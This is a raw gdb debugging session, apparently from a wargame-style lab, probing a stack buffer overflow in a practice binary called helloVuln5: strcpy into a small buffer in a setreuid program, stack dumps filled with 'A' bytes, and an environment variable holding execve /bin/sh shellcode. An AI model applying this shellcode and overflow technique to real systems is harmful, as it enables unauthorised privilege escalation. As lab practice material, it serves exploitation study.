0xbfbf8604:     0xbfbf9d01      0xbfbf9d35      0xbfbf9d57      0xbfbf9d66
0xbfbf8614:     0xbfbf9d77      0xbfbf9d8b      0xbfbf9d9e      0xbfbf9daa
0xbfbf8624:     0xbfbf9dcc      0xbfbf9ded      0xbfbf9e06      0xbfbf9e18
0xbfbf8634:     0xbfbf9e3a      0xbfbf9e7b      0xbfbf9e8e      0xbfbf9ea4
0xbfbf8644:     0xbfbf9eb4      0xbfbf9ebf      0xbfbf9ec7      0xbfbf9ed6
(gdb) x/8 $ebp
0xbfbf8518:     0xbfbf8548      0x0804873b      0xbfbf9700      0x000003ee
0xbfbf8528:     0xbfbf8548      0x080486f4      0x00000002      0xbfbf85f4
(gdb) x/8 $ebp - 4
0xbfbf8514:     0xb7e5fb66      0xbfbf8548      0x0804873b      0xbfbf9700
0xbfbf8524:     0x000003ee      0xbfbf8548      0x080486f4      0x00000002
(gdb) x/8 $ebp +4
0xbfbf851c:     0x0804873b      0xbfbf9700      0x000003ee      0xbfbf8548
0xbfbf852c:     0x080486f4      0x00000002      0xbfbf85f4      0xbfbf8600
(gdb) x/8 $ebp - 0x28
0xbfbf84f0:     0xb7f79f69      0xbfbf8560      0xb7f47000      0x00000000
0xbfbf8500:     0x00000000      0x00000000      0x00000000      0x00000028
(gdb) x/8s $ebp - 0x28
0xbfbf84f0:     "i\237\367\267`\205\277\277"
0xbfbf84f9:     <incomplete sequence \364\267>
0xbfbf84fd:     ""
0xbfbf84fe:     ""
0xbfbf84ff:     ""
0xbfbf8500:     ""
0xbfbf8501:     ""
0xbfbf8502:     ""
(gdb) x/8s 0xb7f79f69
0xb7f79f69 <_dl_fixup+9>:       "\201Ǘ\200\001"
0xb7f79f6f <_dl_fixup+15>:      "\203\354,\213H4\213X8\211|$\b\213q\004\213H|\003Q\004\211t$\f\211ՋR\004\213}"
0xb7f79f91 <_dl_fixup+49>:      "\211\326\301\356\b\211\361\301\341\004\003K\004\213\030\001߀\372\a\211L$\034\017\205\005\001"
0xb7f79fae <_dl_fixup+78>:      ""
0xb7f79faf <_dl_fixup+79>:      "\366A\r\003\211\375\017\205\245"
0xb7f79fb9 <_dl_fixup+89>:      ""
0xb7f79fba <_dl_fixup+90>:      ""
0xb7f79fbb <_dl_fixup+91>:      "\213\230", <incomplete sequence \344>
(gdb) x/8s *0xb7f79f69
0x8097c781:     <error: Cannot access memory at address 0x8097c781>
0x8097c781:     <error: Cannot access memory at address 0x8097c781>
0x8097c781:     <error: Cannot access memory at address 0x8097c781>
0x8097c781:     <error: Cannot access memory at address 0x8097c781>
0x8097c781:     <error: Cannot access memory at address 0x8097c781>
0x8097c781:     <error: Cannot access memory at address 0x8097c781>
0x8097c781:     <error: Cannot access memory at address 0x8097c781>
0x8097c781:     <error: Cannot access memory at address 0x8097c781>
(gdb) x/8s &0xb7f79f69
Attempt to take address of value not located in memory.
(gdb) x/8s $ebp - 0x28
0xbfbf84f0:     "i\237\367\267`\205\277\277"
0xbfbf84f9:     <incomplete sequence \364\267>
0xbfbf84fd:     ""
0xbfbf84fe:     ""
0xbfbf84ff:     ""
0xbfbf8500:     ""
0xbfbf8501:     ""
0xbfbf8502:     ""
(gdb) x/80dx $ebp - 0x4
0xbfbf8514:     0x66    0xfb    0xe5    0xb7    0x48    0x85    0xbf    0xbf
0xbfbf851c:     0x3b    0x87    0x04    0x08    0x00    0x97    0xbf    0xbf
0xbfbf8524:     0xee    0x03    0x00    0x00    0x48    0x85    0xbf    0xbf
0xbfbf852c:     0xf4    0x86    0x04    0x08    0x02    0x00    0x00    0x00
0xbfbf8534:     0xf4    0x85    0xbf    0xbf    0x00    0x86    0xbf    0xbf
0xbfbf853c:     0x88    0x88    0x04    0x08    0x60    0x85    0xbf    0xbf
0xbfbf8544:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfbf854c:     0x21    0x7f    0xd8    0xb7    0x00    0x70    0xf4    0xb7
0xbfbf8554:     0x00    0x70    0xf4    0xb7    0x00    0x00    0x00    0x00
0xbfbf855c:     0x21    0x7f    0xd8    0xb7    0x02    0x00    0x00    0x00
(gdb) x/80x $ebp - 0x4
0xbfbf8514:     0x66    0xfb    0xe5    0xb7    0x48    0x85    0xbf    0xbf
0xbfbf851c:     0x3b    0x87    0x04    0x08    0x00    0x97    0xbf    0xbf
0xbfbf8524:     0xee    0x03    0x00    0x00    0x48    0x85    0xbf    0xbf
0xbfbf852c:     0xf4    0x86    0x04    0x08    0x02    0x00    0x00    0x00
0xbfbf8534:     0xf4    0x85    0xbf    0xbf    0x00    0x86    0xbf    0xbf
0xbfbf853c:     0x88    0x88    0x04    0x08    0x60    0x85    0xbf    0xbf
0xbfbf8544:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfbf854c:     0x21    0x7f    0xd8    0xb7    0x00    0x70    0xf4    0xb7
0xbfbf8554:     0x00    0x70    0xf4    0xb7    0x00    0x00    0x00    0x00
0xbfbf855c:     0x21    0x7f    0xd8    0xb7    0x02    0x00    0x00    0x00
(gdb) x/80xw $ebp - 0x4
0xbfbf8514:     0xb7e5fb66      0xbfbf8548      0x0804873b      0xbfbf9700
0xbfbf8524:     0x000003ee      0xbfbf8548      0x080486f4      0x00000002
0xbfbf8534:     0xbfbf85f4      0xbfbf8600      0x08048888      0xbfbf8560
0xbfbf8544:     0x00000000      0x00000000      0xb7d87f21      0xb7f47000
0xbfbf8554:     0xb7f47000      0x00000000      0xb7d87f21      0x00000002
0xbfbf8564:     0xbfbf85f4      0xbfbf8600      0xbfbf8584      0x00000001
0xbfbf8574:     0x00000000      0xb7f47000      0xb7f7a76a      0xb7f92000
0xbfbf8584:     0x00000000      0xb7f47000      0x00000000      0x00000000
0xbfbf8594:     0x75384b7b      0xbacf4d6b      0x00000000      0x00000000
0xbfbf85a4:     0x00000000      0x00000002      0x080484e0      0x00000000
0xbfbf85b4:     0xb7f7fe30      0xb7f7a9c0      0x0804a000      0x00000002
0xbfbf85c4:     0x080484e0      0x00000000      0x08048512      0x080486d4
0xbfbf85d4:     0x00000002      0xbfbf85f4      0x08048750      0x080487b0
0xbfbf85e4:     0xb7f7a9c0      0xbfbf85ec      0xb7f92940      0x00000002
0xbfbf85f4:     0xbfbf96e0      0xbfbf9700      0x00000000      0xbfbf9715
0xbfbf8604:     0xbfbf9d01      0xbfbf9d35      0xbfbf9d57      0xbfbf9d66
0xbfbf8614:     0xbfbf9d77      0xbfbf9d8b      0xbfbf9d9e      0xbfbf9daa
0xbfbf8624:     0xbfbf9dcc      0xbfbf9ded      0xbfbf9e06      0xbfbf9e18
0xbfbf8634:     0xbfbf9e3a      0xbfbf9e7b      0xbfbf9e8e      0xbfbf9ea4
0xbfbf8644:     0xbfbf9eb4      0xbfbf9ebf      0xbfbf9ec7      0xbfbf9ed6
(gdb) disass main
Dump of assembler code for function main:
   0x080486d4 <+0>:     lea    0x4(%esp),%ecx
   0x080486d8 <+4>:     and    $0xfffffff0,%esp
   0x080486db <+7>:     pushl  -0x4(%ecx)
   0x080486de <+10>:    push   %ebp
   0x080486df <+11>:    mov    %esp,%ebp
   0x080486e1 <+13>:    push   %ebx
   0x080486e2 <+14>:    push   %ecx
   0x080486e3 <+15>:    sub    $0x10,%esp
   0x080486e6 <+18>:    mov    %ecx,%ebx
   0x080486e8 <+20>:    movl   $0x8048888,-0xc(%ebp)
   0x080486ef <+27>:    call   0x80485fb <verifyLevelDecryption>
   0x080486f4 <+32>:    test   %eax,%eax
   0x080486f6 <+34>:    je     0x8048715 <main+65>
   0x080486f8 <+36>:    sub    $0x8,%esp
   0x080486fb <+39>:    pushl  -0xc(%ebp)
   0x080486fe <+42>:    push   $0x804891c
   0x08048703 <+47>:    call   0x8048430 <printf@plt>
   0x08048708 <+52>:    add    $0x10,%esp
   0x0804870b <+55>:    sub    $0xc,%esp
   0x0804870e <+58>:    push   $0x0
   0x08048710 <+60>:    call   0x8048480 <exit@plt>
   0x08048715 <+65>:    sub    $0x8,%esp
   0x08048718 <+68>:    push   $0x3ee
   0x0804871d <+73>:    push   $0x3ee
   0x08048722 <+78>:    call   0x80484a0 <setreuid@plt>
   0x08048727 <+83>:    add    $0x10,%esp
   0x0804872a <+86>:    mov    0x4(%ebx),%eax
   0x0804872d <+89>:    add    $0x4,%eax
   0x08048730 <+92>:    mov    (%eax),%eax
   0x08048732 <+94>:    sub    $0xc,%esp
   0x08048735 <+97>:    push   %eax
   0x08048736 <+98>:    call   0x8048651 <vulnFunction>
   0x0804873b <+103>:   add    $0x10,%esp
   0x0804873e <+106>:   mov    $0x0,%eax
   0x08048743 <+111>:   lea    -0x8(%ebp),%esp
   0x08048746 <+114>:   pop    %ecx
   0x08048747 <+115>:   pop    %ebx
   0x08048748 <+116>:   pop    %ebp
   0x08048749 <+117>:   lea    -0x4(%ecx),%esp
   0x0804874c <+120>:   ret    
End of assembler dump.
(gdb) disass vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
   0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
=> 0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) b *0x080486ba
Breakpoint 3 at 0x80486ba
(gdb) cont
Continuing.

Breakpoint 3, 0x080486ba in vulnFunction ()
(gdb) x/80xw $ebp - 0x4
0xbfbf8514:     0xb7e5fb66      0xbfbf8548      0x0804873b      0xbfbf9700
0xbfbf8524:     0x000003ee      0xbfbf8548      0x080486f4      0x00000002
0xbfbf8534:     0xbfbf85f4      0xbfbf8600      0x08048888      0xbfbf8560
0xbfbf8544:     0x00000000      0x00000000      0xb7d87f21      0xb7f47000
0xbfbf8554:     0xb7f47000      0x00000000      0xb7d87f21      0x00000002
0xbfbf8564:     0xbfbf85f4      0xbfbf8600      0xbfbf8584      0x00000001
0xbfbf8574:     0x00000000      0xb7f47000      0xb7f7a76a      0xb7f92000
0xbfbf8584:     0x00000000      0xb7f47000      0x00000000      0x00000000
0xbfbf8594:     0x75384b7b      0xbacf4d6b      0x00000000      0x00000000
0xbfbf85a4:     0x00000000      0x00000002      0x080484e0      0x00000000
0xbfbf85b4:     0xb7f7fe30      0xb7f7a9c0      0x0804a000      0x00000002
0xbfbf85c4:     0x080484e0      0x00000000      0x08048512      0x080486d4
0xbfbf85d4:     0x00000002      0xbfbf85f4      0x08048750      0x080487b0
0xbfbf85e4:     0xb7f7a9c0      0xbfbf85ec      0xb7f92940      0x00000002
0xbfbf85f4:     0xbfbf96e0      0xbfbf9700      0x00000000      0xbfbf9715
0xbfbf8604:     0xbfbf9d01      0xbfbf9d35      0xbfbf9d57      0xbfbf9d66
0xbfbf8614:     0xbfbf9d77      0xbfbf9d8b      0xbfbf9d9e      0xbfbf9daa
0xbfbf8624:     0xbfbf9dcc      0xbfbf9ded      0xbfbf9e06      0xbfbf9e18
0xbfbf8634:     0xbfbf9e3a      0xbfbf9e7b      0xbfbf9e8e      0xbfbf9ea4
0xbfbf8644:     0xbfbf9eb4      0xbfbf9ebf      0xbfbf9ec7      0xbfbf9ed6
(gdb) x/80xw $eax
0xbfbf84fc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfbf850c:     0x41414141      0x00000000      0xb7e5fb66      0xbfbf8548
0xbfbf851c:     0x0804873b      0xbfbf9700      0x000003ee      0xbfbf8548
0xbfbf852c:     0x080486f4      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf853c:     0x08048888      0xbfbf8560      0x00000000      0x00000000
0xbfbf854c:     0xb7d87f21      0xb7f47000      0xb7f47000      0x00000000
0xbfbf855c:     0xb7d87f21      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf856c:     0xbfbf8584      0x00000001      0x00000000      0xb7f47000
0xbfbf857c:     0xb7f7a76a      0xb7f92000      0x00000000      0xb7f47000
0xbfbf858c:     0x00000000      0x00000000      0x75384b7b      0xbacf4d6b
0xbfbf859c:     0x00000000      0x00000000      0x00000000      0x00000002
0xbfbf85ac:     0x080484e0      0x00000000      0xb7f7fe30      0xb7f7a9c0
0xbfbf85bc:     0x0804a000      0x00000002      0x080484e0      0x00000000
0xbfbf85cc:     0x08048512      0x080486d4      0x00000002      0xbfbf85f4
0xbfbf85dc:     0x08048750      0x080487b0      0xb7f7a9c0      0xbfbf85ec
0xbfbf85ec:     0xb7f92940      0x00000002      0xbfbf96e0      0xbfbf9700
0xbfbf85fc:     0x00000000      0xbfbf9715      0xbfbf9d01      0xbfbf9d35
0xbfbf860c:     0xbfbf9d57      0xbfbf9d66      0xbfbf9d77      0xbfbf9d8b
0xbfbf861c:     0xbfbf9d9e      0xbfbf9daa      0xbfbf9dcc      0xbfbf9ded
0xbfbf862c:     0xbfbf9e06      0xbfbf9e18      0xbfbf9e3a      0xbfbf9e7b
(gdb) disp env
env_path_list  environ        envlock        envz_add       envz_entry     envz_get       envz_merge     envz_remove    envz_strip     
(gdb) disp env
env_path_list  environ        envlock        envz_add       envz_entry     envz_get       envz_merge     envz_remove    envz_strip     
(gdb) disp environ
1: environ = (char **) 0xbfbf8600
(gdb) x/60s *environ
0xbfbf9715:     "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...
0xbfbf97dd:     "=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=0"...
0xbfbf98a5:     "1;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.al"...
0xbfbf996d:     "z=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;"...
0xbfbf9a35:     "35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*."...
0xbfbf9afd:     "m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;"...
0xbfbf9bc5:     "35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka="...
0xbfbf9c8d:     "00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
0xbfbf9d01:     "SSH_CONNECTION=192.168.1.188 52579 192.168.1.229 22"
0xbfbf9d35:     "LESSCLOSE=/usr/bin/lesspipe %s %s"
0xbfbf9d57:     "_=/usr/bin/gdb"
0xbfbf9d66:     "LANG=en_US.UTF-8"
0xbfbf9d77:     "OLDPWD=/home/level2"
0xbfbf9d8b:     "XDG_SESSION_ID=311"
0xbfbf9d9e:     "USER=level2"
0xbfbf9daa:     "shellcode=1\300Ph//shh/bin\211\343\211\301\211°\v̀"
0xbfbf9dcc:     "QT_QPA_PLATFORMTHEME=appmenu-qt5"
0xbfbf9ded:     "PWD=/home/level2/Desktop"
0xbfbf9e06:     "HOME=/home/level2"
0xbfbf9e18:     "SSH_CLIENT=192.168.1.188 52579 22"
0xbfbf9e3a:     "XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop"
0xbfbf9e7b:     "SSH_TTY=/dev/pts/0"
0xbfbf9e8e:     "MAIL=/var/mail/level2"
0xbfbf9ea4:     "SHELL=/bin/bash"
0xbfbf9eb4:     "TERM=xterm"
0xbfbf9ebf:     "SHLVL=1"
0xbfbf9ec7:     "LOGNAME=level2"
0xbfbf9ed6:     "DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/bus"
0xbfbf9f0c:     "XDG_RUNTIME_DIR=/run/user/1004"
0xbfbf9f2b:     "PATH=/home/level2/bin:/home/level2/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
0xbfbf9fbc:     "LESSOPEN=| /usr/bin/lesspipe %s"
0xbfbf9fdc:     "/home/level2/Desktop/helloVuln5"
0xbfbf9ffc:     ""
0xbfbf9ffd:     ""
0xbfbf9ffe:     ""
0xbfbf9fff:     ""
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
0xbfbfa000:     <error: Cannot access memory at address 0xbfbfa000>
(gdb) x/60s *0xbfbf9daa
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
(gdb) x/s *0xbfbf9daa
0x6c656873:     <error: Cannot access memory at address 0x6c656873>
(gdb) x/s 0xbfbf9daa:
A syntax error in expression, near `:'.
(gdb) x/s 0xbfbf9daa
0xbfbf9daa:     "shellcode=1\300Ph//shh/bin\211\343\211\301\211°\v̀"
(gdb) x/s 0xbfbf9daa + 8
0xbfbf9db2:     "e=1\300Ph//shh/bin\211\343\211\301\211°\v̀"
(gdb) x/s 0xbfbf9dba
0xbfbf9dba:     "shh/bin\211\343\211\301\211°\v̀"
(gdb) x/s 0xbfbf9db0
0xbfbf9db0:     "ode=1\300Ph//shh/bin\211\343\211\301\211°\v̀"
(gdb) x/s 0xbfbf9db4
0xbfbf9db4:     "1\300Ph//shh/bin\211\343\211\301\211°\v̀"
(gdb) Quit
(gdb) disass vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
   0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
   0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
=> 0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) x/16x $epb -x1c
No symbol "x1c" in current context.
(gdb) x/16x $epb - 0x1c
Argument to arithmetic operation not a number or boolean.
(gdb) x/16x $epb 
Value can't be converted to integer.
(gdb) x/16x %epb 
A syntax error in expression, near `%epb'.
(gdb) info reg $epb
Invalid register `epb'
(gdb) x/16x $ebp - 0x1c
0xbfbf84fc:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbfbf8504:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
(gdb) x/16wx $ebp - 0x1c
0xbfbf84fc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfbf850c:     0x41414141      0x00000000      0xb7e5fb66      0xbfbf8548
0xbfbf851c:     0x0804873b      0xbfbf9700      0x000003ee      0xbfbf8548
0xbfbf852c:     0x080486f4      0x00000002      0xbfbf85f4      0xbfbf8600
(gdb) x/16wx $ebp 
0xbfbf8518:     0xbfbf8548      0x0804873b      0xbfbf9700      0x000003ee
0xbfbf8528:     0xbfbf8548      0x080486f4      0x00000002      0xbfbf85f4
0xbfbf8538:     0xbfbf8600      0x08048888      0xbfbf8560      0x00000000
0xbfbf8548:     0x00000000      0xb7d87f21      0xb7f47000      0xb7f47000
(gdb) x/16wx $ebp - -x10
No symbol "x10" in current context.
(gdb) x/16wx $ebp - 0x10
0xbfbf8508:     0x41414141      0x41414141      0x00000000      0xb7e5fb66
0xbfbf8518:     0xbfbf8548      0x0804873b      0xbfbf9700      0x000003ee
0xbfbf8528:     0xbfbf8548      0x080486f4      0x00000002      0xbfbf85f4
0xbfbf8538:     0xbfbf8600      0x08048888      0xbfbf8560      0x00000000
(gdb) x/16wx $ebp - 0xc
0xbfbf850c:     0x41414141      0x00000000      0xb7e5fb66      0xbfbf8548
0xbfbf851c:     0x0804873b      0xbfbf9700      0x000003ee      0xbfbf8548
0xbfbf852c:     0x080486f4      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf853c:     0x08048888      0xbfbf8560      0x00000000      0x00000000
(gdb) x/16wx $ebp + 0xc
0xbfbf8524:     0x000003ee      0xbfbf8548      0x080486f4      0x00000002
0xbfbf8534:     0xbfbf85f4      0xbfbf8600      0x08048888      0xbfbf8560
0xbfbf8544:     0x00000000      0x00000000      0xb7d87f21      0xb7f47000
0xbfbf8554:     0xb7f47000      0x00000000      0xb7d87f21      0x00000002
(gdb) x/16hx $ebp - 0x10
0xbfbf8508:     0x4141  0x4141  0x4141  0x4141  0x0000  0x0000  0xfb66  0xb7e5
